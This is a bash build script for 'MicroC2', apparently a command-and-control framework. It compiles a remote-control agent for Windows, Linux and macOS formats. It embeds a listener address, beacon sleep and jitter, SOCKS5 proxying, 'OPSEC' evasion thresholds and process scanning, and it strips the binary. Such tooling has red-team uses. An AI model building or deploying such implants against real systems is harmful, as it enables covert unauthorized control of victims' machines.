#!/bin/bash

echo "MicroC2 Agent Builder"
echo "============================="

# --- Configuration Defaults ---
TARGET=""
OUTPUT_DIR=""
BUILD_TYPE="release"
LISTENER_HOST=""
LISTENER_PORT=""
SLEEP_INTERVAL=60
JITTER=2
FORMAT=""
PAYLOAD_ID=""
PROTOCOL="http" # Default protocol
SOCKS5_ENABLED=false
SOCKS5_HOST="127.0.0.1"
SOCKS5_PORT=9050

# OPSEC Defaults
BASE_THRESHOLD_ENTER_FULL_OPSEC=60.0 # To be renamed/repurposed
BASE_THRESHOLD_EXIT_FULL_OPSEC=20.0  # To be renamed/repurposed
# New names for clarity with 3-state system:
BASE_SCORE_THRESHOLD_BG_TO_REDUCED=20.0
BASE_SCORE_THRESHOLD_REDUCED_TO_FULL=60.0
MIN_FULL_OPSEC_SECS=300
MIN_REDUCED_OPSEC_SECS=120
MIN_BG_OPSEC_SECS=60
REDUCED_ACTIVITY_SLEEP_SECS=120 # New
BASE_MAX_C2_FAILS=5
C2_THRESH_INC_FACTOR=1.1
C2_THRESH_DEC_FACTOR=0.9
C2_THRESH_ADJ_INTERVAL=3600 # 1 hour
C2_THRESH_MAX_MULT=2.0
PROC_SCAN_INTERVAL_SECS=300

# --- Parse Command Line Arguments ---
# Parse command line arguments
while [[ $# -gt 0 ]]; do
  case $1 in
    --target)
      TARGET="$2"
      shift 2
      ;;
    --output)
      OUTPUT_DIR="$2"
      shift 2
      ;;
    --build-type)
      BUILD_TYPE="$2"
      shift 2
      ;;
    --format)
      FORMAT="$2"
      shift 2
      ;;
    --listener-host)
      LISTENER_HOST="$2"
      shift 2
      ;;
    --listener-port)
      LISTENER_PORT="$2"
      shift 2
      ;;
    --sleep)
      SLEEP_INTERVAL="$2"
      shift 2
      ;;
    --jitter)
      JITTER="$2"
      shift 2
      ;;
    --payload-id)
      PAYLOAD_ID="$2"
      shift 2
      ;;
    --protocol)
      PROTOCOL="$2"
      shift 2
      ;;
    --socks5-enabled)
      SOCKS5_ENABLED=$2
      shift 2
      ;;
    --socks5-host)
      SOCKS5_HOST="$2"
      shift 2
      ;;
    --socks5-port)
      SOCKS5_PORT=$2
      shift 2
      ;;
    # Add OPSEC related flags if desired, or rely on env vars/defaults
    --base-score-bg-reduced)
      BASE_SCORE_THRESHOLD_BG_TO_REDUCED=$2
      shift 2
      ;;
    --base-score-reduced-full)
      BASE_SCORE_THRESHOLD_REDUCED_TO_FULL=$2
      shift 2
      ;;
    --reduced-activity-sleep)
      REDUCED_ACTIVITY_SLEEP_SECS=$2
      shift 2
      ;;
    # Example for one OPSEC param:
    # --base-max-c2-fails)
    #   BASE_MAX_C2_FAILS=$2
    #   shift 2
    #   ;;
    *)
      echo "Unknown option: $1"
      shift
      ;;
  esac
done

# Validate required flags
if [ -z "$LISTENER_HOST" ] || [ -z "$LISTENER_PORT" ]; then
  echo "Error: --listener-host and --listener-port are required" >&2
  exit 1
fi

# Use environment variables if arguments not provided
if [ -z "$TARGET" ]; then
    TARGET=${TARGET:-"x86_64-unknown-linux-gnu"}
fi

# IMPORTANT: Properly set server address and port
if [ -z "$LISTENER_HOST" ]; then
    # Get primary interface IP, but don't use 0.0.0.0 as it's not routable
    DEFAULT_IP=$(ip route get 1 | awk '{print $7;exit}')
    # If the IP is 0.0.0.0 or empty, fall back to 127.0.0.1
    if [ -z "$DEFAULT_IP" ] || [ "$DEFAULT_IP" == "0.0.0.0" ]; then
        DEFAULT_IP="127.0.0.1"
    fi
    SERVER_IP=${LISTENER_HOST:-$DEFAULT_IP}
else
    SERVER_IP=$LISTENER_HOST
fi

# Use provided port or default to listener config port
SERVER_PORT=${LISTENER_PORT:-8443}

# Store original output dir (as provided by the server)
ORIGINAL_OUTPUT_DIR="$OUTPUT_DIR"

# Handle relative/absolute paths
if [[ "$OUTPUT_DIR" != /* ]]; then
    # If relative path, make it absolute from current directory
    OUTPUT_DIR="$(pwd)/$OUTPUT_DIR"
fi

# Determine payload ID if not provided
if [ -z "$PAYLOAD_ID" ]; then
    # If not provided via --payload-id argument, try to derive from OUTPUT_DIR
    if [ -n "$OUTPUT_DIR" ]; then
        PAYLOAD_ID=$(basename "$OUTPUT_DIR")
        echo "Derived PAYLOAD_ID from OUTPUT_DIR: $PAYLOAD_ID"
    else
        echo "Warning: OUTPUT_DIR is not set, cannot derive PAYLOAD_ID from it." >&2
    fi
fi

# Ensure PAYLOAD_ID is never empty after the above steps
if [ -z "$PAYLOAD_ID" ]; then
    echo "Warning: PAYLOAD_ID is empty after attempting to derive it. Generating a unique ID." >&2
    if command -v uuidgen &> /dev/null; then
        PAYLOAD_ID=$(uuidgen)
    elif command -v powershell &> /dev/null; then # For Windows/Cross-compile scenarios where bash might be run by PS
        PAYLOAD_ID=$(powershell -Command "[guid]::NewGuid().ToString()")
    elif [ -n "$SYSTEMROOT" ] && command -v powershell.exe &> /dev/null; then # Check for a common Windows env var if system is likely Windows via WSL
        PAYLOAD_ID=$(powershell.exe -Command "[guid]::NewGuid().ToString()")
    else
        # Fallback to a date-based one if no uuidgen and not obviously Windows
        PAYLOAD_ID="agent_$(date +%s%N)"
    fi
    echo "Generated PAYLOAD_ID: $PAYLOAD_ID"
else
    echo "Using determined PAYLOAD_ID: $PAYLOAD_ID"
fi

# Also figure out the server's full path
SERVER_DIR=$(dirname $(dirname "$OUTPUT_DIR"))
echo "Server path: $SERVER_DIR"

echo "Configuration:"
echo "  Target:       $TARGET"
echo "  Output Dir:   $OUTPUT_DIR"
echo "  Original Dir: $ORIGINAL_OUTPUT_DIR"
echo "  Server Dir:   $SERVER_DIR"
echo "  Build Type:   $BUILD_TYPE"
echo "  C2 Server:    ${SERVER_IP}:${SERVER_PORT}"
echo "  Sleep:        ${SLEEP_INTERVAL:-60} seconds"
echo "  Jitter:       ${JITTER:-2} seconds"

if [ -n "$FORMAT" ]; then
    echo "  Format:       ${FORMAT}"
fi

echo "Checking dependencies..."

# Install required packages if not present
# (Consider moving dependency checks to a separate script or making them optional)
# if ! dpkg -l | grep -v "gcc-mingw-w64"; then
#     echo "Installing gcc-mingw-w64..."
#     sudo apt-get install -y gcc-mingw-w64
# fi

# Install cross if not already installed
# if ! command -v cross &> /dev/null; then
#     echo "Installing cross..."
#     cargo install cross
# fi

# --- Generate Comprehensive Agent Config JSON --- 
mkdir -p .config # For build.rs to potentially find config.json here
CONFIG_JSON_CONTENT=$(cat << EOF
{
    "server_url": "${SERVER_IP}:${SERVER_PORT}",
    "sleep_interval": ${SLEEP_INTERVAL},
    "jitter": ${JITTER},
    "payload_id": "${PAYLOAD_ID}",
    "protocol": "${PROTOCOL}",
    "socks5_enabled": ${SOCKS5_ENABLED},
    "socks5_host": "${SOCKS5_HOST}",
    "socks5_port": ${SOCKS5_PORT},
    "base_score_threshold_bg_to_reduced": ${BASE_SCORE_THRESHOLD_BG_TO_REDUCED},
    "base_score_threshold_reduced_to_full": ${BASE_SCORE_THRESHOLD_REDUCED_TO_FULL},
    "min_duration_full_opsec_secs": ${MIN_FULL_OPSEC_SECS},
    "min_duration_reduced_activity_secs": ${MIN_REDUCED_OPSEC_SECS},
    "min_duration_background_opsec_secs": ${MIN_BG_OPSEC_SECS},
    "reduced_activity_sleep_secs": ${REDUCED_ACTIVITY_SLEEP_SECS},
    "base_max_consecutive_c2_failures": ${BASE_MAX_C2_FAILS},
    "c2_failure_threshold_increase_factor": ${C2_THRESH_INC_FACTOR},
    "c2_failure_threshold_decrease_factor": ${C2_THRESH_DEC_FACTOR},
    "c2_threshold_adjust_interval_secs": ${C2_THRESH_ADJ_INTERVAL},
    "c2_dynamic_threshold_max_multiplier": ${C2_THRESH_MAX_MULT},
    "proc_scan_interval_secs": ${PROC_SCAN_INTERVAL_SECS}
}
EOF
)
echo "$CONFIG_JSON_CONTENT" > .config/config.json
echo "Created comprehensive .config/config.json for build-time embedding if env vars are not primary."

# Also place it in the output directory for runtime fallback
mkdir -p "$OUTPUT_DIR/.config"
echo "$CONFIG_JSON_CONTENT" > "$OUTPUT_DIR/.config/config.json"
echo "Copied comprehensive config to $OUTPUT_DIR/.config/config.json for runtime fallback."

echo "Building agent..."

# Determine output extension and artifact name
case "$FORMAT" in
    windows_exe)
        BINARY_EXT=".exe"
        AGENT_OUT="agent.exe"
        ;;
    windows_dll)
        BINARY_EXT=".dll"
        AGENT_OUT="agent.dll"
        ;;
    linux_elf)
        BINARY_EXT=""
        AGENT_OUT="agent"
        ;;
    macos_dylib)
        BINARY_EXT=".dylib"
        AGENT_OUT="libagent.dylib"
        ;;
    linux_so)
        BINARY_EXT=".so"
        AGENT_OUT="libagent.so"
        ;;
    *)
        # Default to Linux ELF
        BINARY_EXT=""
        AGENT_OUT="agent"
        ;;
esac

# Set cargo features only for DLL
CARGO_FEATURES=""
if [ "$FORMAT" == "windows_dll" ]; then
    CARGO_FEATURES="--features dll"
    # .cargo/config.toml for DLL build (already handled by the file being present)
fi

# Set build flags based on build type
BUILD_FLAGS=""
if [ "$BUILD_TYPE" == "release" ]; then
    BUILD_FLAGS="--release"
elif [ "$BUILD_TYPE" == "debug" ]; then
    BUILD_FLAGS=""
else
    echo "Warning: Unknown BUILD_TYPE '$BUILD_TYPE'. Defaulting to release build flags." >&2
    BUILD_FLAGS="--release"
fi

# --- Export Environment Variables for build.rs ---
export LISTENER_HOST="$SERVER_IP"
export LISTENER_PORT="$SERVER_PORT"
export SLEEP_INTERVAL="$SLEEP_INTERVAL"
export PAYLOAD_ID="$PAYLOAD_ID"
export PROTOCOL="$PROTOCOL"
export SOCKS5_ENABLED="$SOCKS5_ENABLED"
export SOCKS5_HOST="$SOCKS5_HOST"
export SOCKS5_PORT="$SOCKS5_PORT"

export BASE_SCORE_THRESHOLD_BG_TO_REDUCED="$BASE_SCORE_THRESHOLD_BG_TO_REDUCED"
export BASE_SCORE_THRESHOLD_REDUCED_TO_FULL="$BASE_SCORE_THRESHOLD_REDUCED_TO_FULL"
export MIN_FULL_OPSEC_SECS="$MIN_FULL_OPSEC_SECS"
export MIN_REDUCED_OPSEC_SECS="$MIN_REDUCED_OPSEC_SECS"
export MIN_BG_OPSEC_SECS="$MIN_BG_OPSEC_SECS"
export REDUCED_ACTIVITY_SLEEP_SECS="$REDUCED_ACTIVITY_SLEEP_SECS"
export BASE_MAX_C2_FAILS="$BASE_MAX_C2_FAILS"
export C2_THRESH_INC_FACTOR="$C2_THRESH_INC_FACTOR"
export C2_THRESH_DEC_FACTOR="$C2_THRESH_DEC_FACTOR"
export C2_THRESH_ADJ_INTERVAL="$C2_THRESH_ADJ_INTERVAL"
export C2_THRESH_MAX_MULT="$C2_THRESH_MAX_MULT"
export PROC_SCAN_INTERVAL_SECS="$PROC_SCAN_INTERVAL_SECS"

echo "[ENV EXPORTS] Set for build.rs:"
echo "  LISTENER_HOST: $LISTENER_HOST"
echo "  PAYLOAD_ID: $PAYLOAD_ID"
echo "  SOCKS5_ENABLED: $SOCKS5_ENABLED"
echo "  BASE_MAX_C2_FAILS: $BASE_MAX_C2_FAILS"
# Add more echos for other critical env vars if needed for debugging

# Build the agent
echo "Building for $TARGET ($FORMAT) with flags: $BUILD_FLAGS $CARGO_FEATURES..."
if [[ "$TARGET" == *windows* ]]; then
    if command -v cross &> /dev/null; then
        cross build $BUILD_FLAGS $CARGO_FEATURES --target $TARGET
    else
        rustup target add $TARGET
        cargo build $BUILD_FLAGS $CARGO_FEATURES --target $TARGET
    fi
else
    cargo build $BUILD_FLAGS $CARGO_FEATURES --target $TARGET
fi

# Determine the build directory
if [ "$BUILD_TYPE" == "debug" ]; then
    BUILD_DIR="target/$TARGET/debug"
else
    BUILD_DIR="target/$TARGET/release"
fi

# Print contents of build directory for debugging
if [ -d "$BUILD_DIR" ]; then
    echo "Contents of $BUILD_DIR before copy:" >&2
    ls -la "$BUILD_DIR" >&2
else
    echo "Build directory $BUILD_DIR does not exist!" >&2
fi

# Copy the built artifact to the output directory
if [ -f "$BUILD_DIR/$AGENT_OUT" ]; then
    echo "Copying $AGENT_OUT to output directory: $OUTPUT_DIR/$AGENT_OUT"
    mkdir -p "$OUTPUT_DIR"
    cp "$BUILD_DIR/$AGENT_OUT" "$OUTPUT_DIR/$AGENT_OUT"
    cp "$BUILD_DIR/$AGENT_OUT" "$OUTPUT_DIR/$(date +%Y%m%d%H%M%S)_$AGENT_OUT"
    echo "Agent binary copied successfully to specified output location"
else
    echo "ERROR: agent binary not found at $BUILD_DIR/$AGENT_OUT" >&2
    echo "Contents of $BUILD_DIR:" >&2
    ls -la "$BUILD_DIR" >&2
    exit 1
fi

# Copy config.json for agent
mkdir -p "$OUTPUT_DIR/.config"
cp "$OUTPUT_DIR/config.json" "$OUTPUT_DIR/.config/config.json"

# Also copy to server's expected location
mkdir -p "$(dirname "$ORIGINAL_OUTPUT_DIR")"
cp "$BUILD_DIR/$AGENT_OUT" "$ORIGINAL_OUTPUT_DIR/$AGENT_OUT"
cp "$OUTPUT_DIR/config.json" "$ORIGINAL_OUTPUT_DIR/config.json"
mkdir -p "$ORIGINAL_OUTPUT_DIR/.config"
cp "$OUTPUT_DIR/config.json" "$ORIGINAL_OUTPUT_DIR/.config/config.json"

# Strip and compress if possible
if [ -f "$OUTPUT_DIR/$AGENT_OUT" ]; then
    echo "Stripping binary..."
    strip "$OUTPUT_DIR/$AGENT_OUT" || true
    # if command -v upx &> /dev/null; then
    #     echo "Compressing binary with upx..."
    #     upx --best --lzma "$OUTPUT_DIR/$AGENT_OUT"
    # fi
fi

# Final output checks
echo "Final output directory contents:"
ls -la "$OUTPUT_DIR"
echo "Server directory contents:"
ls -la "$ORIGINAL_OUTPUT_DIR"

# DLL check
if [ "$FORMAT" == "windows_dll" ]; then
    if [ -f "$OUTPUT_DIR/agent.dll" ]; then
        echo "SUCCESS: agent.dll was found at $OUTPUT_DIR/agent.dll"
        stat -c "File size: %s bytes" "$OUTPUT_DIR/agent.dll"
    else
        echo "ERROR: agent.dll was not found in the output directory"
        exit 1
    fi
fi

echo "Build process completed"
